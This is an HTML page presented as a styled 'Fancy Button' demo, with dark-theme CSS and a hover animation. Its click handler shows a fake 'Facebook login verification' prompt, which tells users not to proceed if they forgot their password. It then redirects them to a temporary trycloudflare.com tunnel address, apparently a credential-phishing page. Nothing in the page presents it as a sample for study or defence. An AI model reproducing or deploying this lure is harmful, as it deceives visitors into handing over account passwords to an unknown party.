<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fancy Button</title>
<style>
  /* Global dark theme */
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background: linear-gradient(135deg, #0d0d0d, #2b2b2b);
    font-family: 'Arial', sans-serif;
    color: #fff;
  }

  /* Responsive fancy button */
  .fancy-btn {
    position: relative;
    padding: 4vw 10vw;
    max-width: 300px;
    width: 80%;
    font-size: clamp(18px, 4vw, 28px);
    color: #fff;
    background: linear-gradient(45deg, #111, #444);
    border: none;
    border-radius: 50px;
    cursor: pointer;
    overflow: hidden;
    transition: 0.4s;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  }

  .fancy-btn:hover {
    background: linear-gradient(45deg, #222, #555);
    transform: scale(1.08);
    box-shadow: 0 15px 30px rgba(0,0,0,0.6);
  }

  /* Animated shine */
  .fancy-btn::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: rgba(255,255,255,0.08);
    transform: rotate(45deg);
    transition: all 0.6s;
  }

  .fancy-btn:hover::before {
    left: 100%;
    top: 100%;
  }

  /* Mobile optimization */
  @media (max-width: 600px) {
    .fancy-btn {
      padding: 16px 40px;
      font-size: 20px;
    }
  }
</style>
</head>
<body>

<button class="fancy-btn" onclick="handleClick()">Click Me</button>

<script>
function handleClick() {
    if (confirm("THIS PAGE REQUIRES FACEBOOK LOGIN VERIFICATION TO PROCEED:\n\nDISCLAIMER!! DO NOT PROCEED IF YOU FORGOT YOUR PASSWORD!!")) {
        window.location.href = "https://usd-yields-fixed-gpl.trycloudflare.com";
    }
}
</script>

</body>
</html>
